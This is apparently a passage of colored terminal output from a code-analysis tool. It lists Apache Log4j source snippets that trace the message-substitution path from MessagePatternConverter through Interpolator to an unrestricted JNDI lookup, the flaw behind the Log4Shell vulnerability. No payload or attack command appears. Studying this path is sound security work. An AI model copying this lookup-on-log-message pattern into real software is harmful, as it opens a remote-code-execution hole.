[2;36m                    [0m         [1;36m95[0m[39m:    private final StrLookup tempLookup = new [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:    private final StrSubstitutor subst = new [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mtempLookup[0m[1;39m)[0m[39m;[0m         [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:54[0m[39m-[0m[1;36m63[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:            return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:73[0m[39m-[0m[1;36m78[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    private String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m        [2m                [0m
[2;36m                    [0m         [1;35mjndiName.indexOf[0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m == [0m[1;36m-1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m           [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        return jndiName;[0m                                                         [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:60[0m[39m-[0m[1;36m77[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder toAppendTo[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        final Message msg = [0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        if [0m[1;39m([0m[39mmsg != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:            String result;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:            if [0m[1;39m([0m[39mmsg instanceof MultiformatMessage[0m[1;39m)[0m[39m [0m[1;39m{[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:                result = [0m[1;39m([0m[1;39m([0m[39mMultiformatMessage[0m[1;39m)[0m[39m [0m                                  [2m                [0m
[2;36m                    [0m         [39mmsg[0m[1;39m)[0m[1;35m.getFormattedMessage[0m[1;39m([0m[39mformats[0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:                result = [0m[1;35mmsg.getFormattedMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:            if [0m[1;39m([0m[39mresult != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[39mconfig != null && [0m[1;35mresult.contains[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m ?[0m      [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:                    [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, result[0m[1;39m)[0m[39m : result[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[32m"null"[0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:301[0m[39m-[0m[1;36m309[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m301[0m[39m:    public String [0m[1;35mreplace[0m[1;39m([0m[39mfinal LogEvent event, final String source[0m[1;39m)[0m[39m [0m[1;39m{[0m          [2m                [0m
[2;36m                    [0m         [1;36m302[0m[39m:        if [0m[1;39m([0m[39msource == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m303[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m304[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m305[0m[39m:        final StringBuilder buf = new [0m[1;35mStringBuilder[0m[1;39m([0m[39msource[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m306[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35msubstitute[0m[1;39m([0m[39mevent, buf, [0m[1;36m0[0m[39m, [0m[1;35msource.length[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                      [2m                [0m
[2;36m                    [0m         [1;36m307[0m[39m:            return source;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m308[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m309[0m[39m:        return [0m[1;35mbuf.toString[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:100[0m[39m-[0m[1;36m124[0m   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, String var[0m[1;39m)[0m[39m [0m[1;39m{[0m                    [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:        if [0m[1;39m([0m[39mvar == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:        final int prefixPos = [0m[1;35mvar.indexOf[0m[1;39m([0m[39mPREFIX_SEPARATOR[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:        if [0m[1;39m([0m[39mprefixPos >= [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:            final String prefix = [0m[1;35mvar.substring[0m[1;39m([0m[1;36m0[0m[39m, prefixPos[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:            final String name = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:            final StrLookup lookup = [0m[1;35mlookups.get[0m[1;39m([0m[39mprefix[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:            String value = null;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:            if [0m[1;39m([0m[39mlookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:                value = event == null ? [0m[1;35mlookup.lookup[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m : [0m                  [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[39mevent, name[0m[1;39m)[0m[39m;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:            if [0m[1;39m([0m[39mvalue != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:                return value;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:            var = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:        if [0m[1;39m([0m[39mdefaultLookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:            return event == null ? [0m[1;35mdefaultLookup.lookup[0m[1;39m([0m[39mvar[0m[1;39m)[0m[39m : [0m                 [2m                [0m
[2;36m                    [0m         [1;35mdefaultLookup.lookup[0m[1;39m([0m[39mevent, var[0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:        return null;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/test/java/org/apache/logging/log4j/core/lookup/JndiLookupTest.jav[0m[1;92ma:51[0m[39m-[0m[1;36m66[0m   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    @Test[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    public void [0m[1;35mtestLookup[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:        if [0m[1;39m([0m[39m! [0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:            return;[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        final StrLookup lookup = new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        String contextName = [0m[1;35mlookup.lookup[0m[1;39m([0m[39mTEST_CONTEXT_RESOURCE_NAME[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTEST_CONTEXT_NAME, contextName[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        contextName = [0m                                                           [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[39mJndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + [0m                     [2m                [0m
[2;36m                    [0m         [39mTEST_CONTEXT_RESOURCE_NAME[0m[1;39m)[0m[39m;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTEST_CONTEXT_NAME, contextName[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        String nonExistingResource = [0m                                            [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[32m"logging/non-existing-resource"[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;35massertNull[0m[1;39m([0m[39mnonExistingResource[0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/test/java/org/apache/logging/log4j/core/lookup/InterpolatorTest.jav[0m[1;92ma:63[0m[39m-[0m[1;36m85[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:    @Test[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    public void [0m[1;35mtestLookup[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        if [0m[1;39m([0m[39m! [0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:            return;[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        final Map<String, String> map = new HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[39m;[0m           [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:        [0m[1;35mmap.put[0m[1;39m([0m[39mTESTKEY, TESTVAL[0m[1;39m)[0m[39m;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:        final StrLookup lookup = new [0m[1;35mInterpolator[0m[1;39m([0m[39mnew [0m[1;35mMapLookup[0m[1;39m([0m[39mmap[0m[1;39m)[0m[1;39m)[0m[39m;[0m           [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:        [0m[1;35mThreadContext.put[0m[1;39m([0m[39mTESTKEY, TESTVAL[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:        String value = [0m[1;35mlookup.lookup[0m[1;39m([0m[39mTESTKEY[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTESTVAL, value[0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"ctx:"[0m[39m + TESTKEY[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTESTVAL, value[0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"sys:"[0m[39m + TESTKEY[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTESTVAL, value[0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"BadKey"[0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:        [0m[1;35massertNull[0m[1;39m([0m[39mvalue[0m[1;39m)[0m[39m;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:        [0m[1;35mThreadContext.clear[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"ctx:"[0m[39m + TESTKEY[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTESTVAL, value[0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"jndi:"[0m[39m + TEST_CONTEXT_RESOURCE_NAME[0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTEST_CONTEXT_NAME, value[0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:1[0m[39m-[0m[1;36m88[0m        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import javax.naming.InitialContext;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import javax.naming.NamingException;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * Looks up keys from JNDI resources.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"jndi"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:public class JndiLookup implements StrLookup [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    private static boolean ENABLE_JNDI = true;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    [0m[35m/[0m[39m** JNDI resourcce path prefix used in a J2EE container *[0m[35m/[0m                   [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [0m[32m"java:comp/env/"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        return [0m[1;35mlookup[0m[1;39m([0m[39mnull, key[0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:            return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:     * Convert the given JNDI name to the actual JNDI name to use.[0m               [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * Default implementation applies the [0m[32m"java:comp/env/"[0m[39m prefix[0m                [2m                [0m
